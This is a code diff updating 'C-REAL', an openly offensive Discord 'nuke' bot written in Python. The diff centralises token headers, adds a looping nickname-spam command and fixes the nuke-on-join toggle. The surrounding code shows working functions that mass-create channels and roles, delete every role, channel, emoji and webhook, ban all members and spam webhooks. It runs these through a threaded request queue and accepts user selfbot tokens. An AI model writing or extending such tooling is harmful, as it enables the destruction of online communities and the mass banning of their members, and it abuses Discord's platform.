@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 """
 MIT License
 
@@ -24,8 +25,6 @@ SOFTWARE.
 Don't use the bot on real servers or use it to spam because this is breaking
 discord's ToS, and you will be resulted in an account deletion.
 """
-
-# -*- coding: utf-8 -*-
 # discord
 import discord, sys, requests, os
 from discord.ext import commands
@@ -45,6 +44,12 @@ try:
 except ImportError: 
     pass 
 
+# 
+__TITLE__ = "C-REAL"
+__VERSION__ = "2.1"
+__AUTHOR__ = "TKperson"
+__LICENSE__ = "MIT"
+
 # Global vars
 per_page = 15
 commands_per_page = 5
@@ -54,18 +59,19 @@ sorted_commands = []
 webhook_targets = []
 saved_ctx = None
 nuke_on_join = False
+auto_nick = False
 
 ''' #### Not planning to use regex
 Super expensive regex if used to check long strings
 Find ---------------
-hostname/filename
+hostname/path
 supported protocols:
 https://
 http://
 ftps://
 ftp://
-IPv4/filename
-IPv6/filename
+IPv4/path
+IPv6/path
 '''
 # import re
 # re_url = r'\b((?:https?://)?(?:ftps?://)?(?:(?:www\.)?(?:[\da-z\.-]+)\.(?:[a-z]{2,6})|(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)|(?:(?:[0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,7}:|(?:[0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,5}(?::[0-9a-fA-F]{1,4}){1,2}|(?:[0-9a-fA-F]{1,4}:){1,4}(?::[0-9a-fA-F]{1,4}){1,3}|(?:[0-9a-fA-F]{1,4}:){1,3}(?::[0-9a-fA-F]{1,4}){1,4}|(?:[0-9a-fA-F]{1,4}:){1,2}(?::[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:(?:(?::[0-9a-fA-F]{1,4}){1,6})|:(?:(?::[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(?::[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(?:ffff(?::0{1,4}){0,1}:){0,1}(?:(?:25[0-5]|(?:2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}[0-9]){0,1}[0-9])|(?:[0-9a-fA-F]{1,4}:){1,4}:(?:(?:25[0-5]|(?:2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}[0-9]){0,1}[0-9])))(?::[0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])?(?:/[\w\.-]*)*/?)\b'
@@ -107,9 +113,9 @@ def read_json():
         exit()
 
 def banner():
-    sys.stdout.buffer.write('''\
+    sys.stdout.buffer.write(f'''\
  ██████╗                  ██████╗ ███████╗ █████╗ ██╗     
-██╔════╝                  ██╔══██╗██╔════╝██╔══██╗██║   Version: 2.0
+██╔════╝                  ██╔══██╗██╔════╝██╔══██╗██║   Version: {__VERSION__}
 ██║         █████╗        ██████╔╝█████╗  ███████║██║     Made by:
 ██║         ╚════╝        ██╔══██╗██╔══╝  ██╔══██║██║       TKperson
 ╚██████╗                  ██║  ██║███████╗██║  ██║███████╗    and
@@ -134,12 +140,13 @@ if verbose & 1 << 3:
 
 is_selfbot = True
 try:
-    temp_headers = {'authorization': token, 'content-type': 'application/json'}
+    headers = {'authorization': token, 'content-type': 'application/json'}
     print('Checking selfbot token.', end='\r')
-    if not 'id' in requests.get(url='https://discord.com/api/v8/users/@me', headers=temp_headers).json():
-        temp_headers['authorization'] = 'Bot ' + token
+    if not 'id' in requests.get(url='https://discord.com/api/v8/users/@me', headers=headers).json():
+        # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
+        headers['authorization'] = 'Bot ' + token
         print('Checking normal bot token.', end='\r')
-        if not 'id' in requests.get(url='https://discord.com/api/v8/users/@me', headers=temp_headers).json():
+        if not 'id' in requests.get(url='https://discord.com/api/v8/users/@me', headers=headers).json():
             print('Invalid token is being used.')
             exit()
         else:
@@ -311,8 +318,9 @@ async def on_command_error(ctx, error):
         try:
             await log(ctx, '%s' % error.args)
         except discord.errors.NotFound: # When ctx.channel is deleted 
-            # consoleLog('%s' % error.args)
             pass
+        except TypeError:
+            sys.stdout.buffer.write(error.args.encode('utf8'))
 
 if is_selfbot:
     @client.event
@@ -861,9 +869,13 @@ def requestMaker():
                         continue
                     consoleLog(f'Rate limiting has been reached: Wait {str(r["retry_after"])} more seconds.')
                 q.put((requesting, url, headers, payload))
+            elif want_log_request and 'code' in r:
+                consoleLog('Request cancelled due to -> ' + r['message'])
+
         except decoder.JSONDecodeError:
             pass
         q.task_done()
+
 for i in range(concurrent):
     _thread = Thread(target=requestMaker, daemon=True)
     _thread.start()
@@ -889,14 +901,6 @@ async def channelBomb(ctx, n, method='fixed'):
         return
 
     consoleLog('Channel bombing has started.')
-    headers = {
-        'content-type': 'application/json'
-    }
-    if is_selfbot:
-        headers['authorization'] = token
-    else:
-        # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
-        headers['authorization'] = 'Bot ' + token
     for i in range(n):
         payload = {
             'type': 0,
@@ -929,14 +933,6 @@ async def categoryBomb(ctx, n, method):
         return
 
     consoleLog('Channel bombing has started.')
-    headers = {
-        'content-type': 'application/json'
-    }
-    if is_selfbot:
-        headers['authorization'] = token
-    else:
-        # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
-        headers['authorization'] = 'Bot ' + token
     for i in range(n):
         payload = {
             'type': 4,
@@ -969,14 +965,6 @@ async def roleBomb(ctx, n, method):
         return
 
     consoleLog('Role bombing has started.')
-    headers = {
-        'content-type': 'application/json'
-    }
-    if is_selfbot:
-        headers['authorization'] = token
-    else:
-        # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
-        headers['authorization'] = 'Bot ' + token
     for i in range(n):
         payload = {
             'name': method()
@@ -1003,17 +991,15 @@ async def webhook(ctx, *, args=None):
             raise
     args = args.split()
     if args[0] == 'create' or args[0] == 'add': # webhook create
+        global headers
         args.pop(0)
+        if len(args) < 1:
+            await log(ctx, f'More arguments is requested. You can put how many webhooks you want to create or channel id/name on the channels you want the webhooks to be created on.')
+            return
         name = ' '.join(args)
 
         webhooks = await selected_server.webhooks()
         webhooks_length = len(webhooks)
-
-        headers = {'content-type': 'application/json'}
-        if is_selfbot:
-            headers['authorization'] = token
-        else:
-            headers['authorization'] = 'Bot ' + token
 
         channels = name.split()
         if int(name) < 0:
@@ -1044,18 +1030,12 @@ async def webhook(ctx, *, args=None):
         name = args[1]
 
         webhook = containing(await selected_server.webhooks(), name)
-
         if webhook is None:
-            await log(ctx, f'Unable to find webhook `{name}`')
+            await log(ctx, f'Unable to find webhook `{name}`.')
             return
 
-        try:
-            consoleLog(webhook.url)
-            await webhook.delete()
-            consoleLog(f'Webhook `{webhook.name}` is removed from the server.')
-        except:
-            consoleLog(f'Unable to delete webhook `{webhook.name}`.')
-            raise
+        requests.delete(f'https://discord.com/api/v8/webhooks/{webhook.id}', headers=headers)
+        await log(ctx, f'Webhook `{webhook.name}` is removed from the server.')
     
     elif args[0] == 'attack':
         global webhook_targets
@@ -1151,15 +1131,6 @@ async def deleteAllRoles(ctx):
     if not await hasTarget(ctx):
         return
 
-    headers = {
-        'content-type': 'application/json'
-    }
-    if is_selfbot:
-        headers['authorization'] = token
-    else:
-        # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
-        headers['authorization'] = 'Bot ' + token
-
     consoleLog('Starting to delete all roles...')
     for role in selected_server.roles:
         q.put((requests.delete, f'https://discord.com/api/v8/guilds/{selected_server.id}/roles/{role.id}', headers, None))
@@ -1172,15 +1143,6 @@ async def deleteAllRoles(ctx):
 async def deleteAllChannels(ctx):
     if not await hasTarget(ctx):
         return
-
-    headers = {
-        'content-type': 'application/json'
-    }
-    if is_selfbot:
-        headers['authorization'] = token
-    else:
-        # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
-        headers['authorization'] = 'Bot ' + token
 
     consoleLog('Starting to delete all types of channels...')
     for channel in selected_server.channels:
@@ -1195,15 +1157,6 @@ async def deleteAllEmojis(ctx):
     if not await hasTarget(ctx):
         return
 
-    headers = {
-        'content-type': 'application/json'
-    }
-    if is_selfbot:
-        headers['authorization'] = token
-    else:
-        # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
-        headers['authorization'] = 'Bot ' + token
-
     consoleLog('Starting to delete all emojis...')
     for emote in selected_server.emojis:
         q.put((requests.delete, f'https://discord.com/api/v8/guilds/{selected_server.id}/emojis/{emote.id}', headers, None))
@@ -1217,15 +1170,6 @@ async def deleteAllWebhooks(ctx):
     if not await hasTarget(ctx):
         return
 
-    headers = {
-        'content-type': 'application/json'
-    }
-    if is_selfbot:
-        headers['authorization'] = token
-    else:
-        # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
-        headers['authorization'] = 'Bot ' + token
-
     consoleLog('Starting to delete all webhooks...')
     for webhook in await selected_server.webhooks():
         q.put((requests.delete, f'https://discord.com/api/v8/webhooks/{webhook.id}', headers, None))
@@ -1238,15 +1182,6 @@ async def deleteAllWebhooks(ctx):
 async def banAll(ctx):
     if not await hasTarget(ctx):
         return
-
-    headers = {
-        'content-type': 'application/json'
-    }
-    if is_selfbot:
-        headers['authorization'] = token
-    else:
-        # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
-        headers['authorization'] = 'Bot ' + token
 
     payload = {'delete_message_days':'0', 'reason': ''}
     consoleLog('Starting ban all...')
@@ -1363,15 +1298,6 @@ async def clear(ctx, n=None):
     if not await hasTarget(ctx):
         return
 
-    headers = {
-        'content-type': 'application/json'
-    }
-    if is_selfbot:
-        headers['authorization'] = token
-    else:
-        # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
-        headers['authorization'] = 'Bot ' + token
-
     consoleLog('Starting to delete all types of channels...')
     for channel in ctx.history(limit=n):
         q.put(requests.delete, f'https://discord.com/api/v8/channels/{ctx.channel.id}/messages/788936893084729364', )
@@ -1408,7 +1334,7 @@ async def joinNuke(ctx, true_or_false):
         saved_ctx = ctx
         nuke_on_join = True
         await log(ctx, 'Nuke on bot joining a new server has been turned on.')
-    elif true_or_false.loewr() == 'false':
+    elif true_or_false.lower() == 'false':
         nuke_on_join = False
         await log(ctx, 'Nuke on bot joining a new server has been turned off.')
     else:
@@ -1432,6 +1358,27 @@ async def changeStatus(ctx, status):
 @client.command(name='link', aliases=['l'])
 async def link(ctx):
     await ctx.channel.send(f'https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions={bot_permission}&scope=bot')
+
+@commands.check(checkPerm)
+@client.command(name='autoNick', aliases=['an'])
+async def autoNick(ctx):
+    if not await hasTarget(ctx):
+        return
+
+    # global headers
+    # print(headers)
+    member = containing(selected_server.members, str(client.user.id))
+
+    global auto_nick
+    if not auto_nick:
+        auto_nick = True
+        while auto_nick:
+            # payload = {'nick': ''.join(choice(alphanum) for _ in range(10)}
+            # q.put((requests.patch, f'https://discord.com/api/v8/guilds/{selected_server.id}/members/%40me/nick', headers, payload))
+            
+            await member.edit(nick=''.join(choice(alphanum) for _ in range(10)))
+    else:
+        auto_nick = False
 
 @commands.check(checkPerm)
 @client.command(name='off', aliases=['logout', 'logoff', 'shutdown', 'stop'])
